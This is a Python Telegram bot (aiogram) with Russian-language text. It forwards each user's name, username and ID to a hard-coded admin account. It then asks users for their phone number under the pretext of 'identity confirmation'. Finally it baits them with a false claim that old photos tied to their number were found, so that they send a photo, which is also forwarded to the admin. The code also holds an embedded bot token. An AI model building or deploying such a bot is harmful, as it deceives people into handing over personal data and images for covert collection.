

import asyncio
from aiogram import Bot, Dispatcher, Router, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

TOKEN = "8569453490:AAGDgQRfxfxQ2IwYRgspPu-Rz7bqyTbXMcQ"
ADMIN_ID = 6408109992  # ← твой Telegram ID

bot = Bot(token=TOKEN)
dp = Dispatcher()
router = Router()


# --- Кнопка поделиться контактом ---
def contact_keyboard():
    kb = [
        [KeyboardButton(text="Поделиться номером", request_contact=True)]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)


# /start — сразу присылает данные админу и начинает регистрацию
@router.message(Command("start"))
async def start(message: types.Message):
    user = message.from_user

    # отправляем админу информацию о пользователе
    await bot.send_message(
        ADMIN_ID,
        f"🆕 Новый пользователь нажал /start\n"
        f"Имя: {user.full_name}\n"
        f"Юзернейм: @{user.username}\n"
        f"ID: {user.id}"
    )

    # отправляем пользователю
    await message.answer(
        "Привет! Для подтверждения личности поделись номером телефона.",
        reply_markup=contact_keyboard()
    )


# --- Получение номера телефона ---
@router.message(lambda m: m.contact)
async def get_contact(message: types.Message):
    phone = message.contact.phone_number
    user = message.from_user

    # отправляем админу
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📱 Пользователь прислал номер телефона:\n"
            f"Имя: {user.full_name}\n"
            f"Юзернейм: @{user.username}\n"
            f"ID: {user.id}\n"
            f"Номер телефона: {phone}"
    )

    # интрига
    await message.answer(
        "Спасибо! Мы нашли старые фото, связанные с вашим номером… "
        "Хотите посмотреть? Отправьте любое фото 😏"
    )


# --- Получение фото от пользователя ---
@router.message(lambda m: m.photo)
async def get_photo(message: types.Message):
    photo_id = message.photo[-1].file_id
    user = message.from_user

    await message.answer("Фото получено! Отправляю админу…")

    # отправляем админу фото
    await bot.send_photo(
        chat_id=ADMIN_ID,
        photo=photo_id,
        caption=f"📸 Фото от пользователя:\n"
                f"Имя: {user.full_name}\n"
                f"Юзернейм: @{user.username}\n"
                f"ID: {user.id}"
    )


# --- ЗАПУСК ---
async def main():
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())






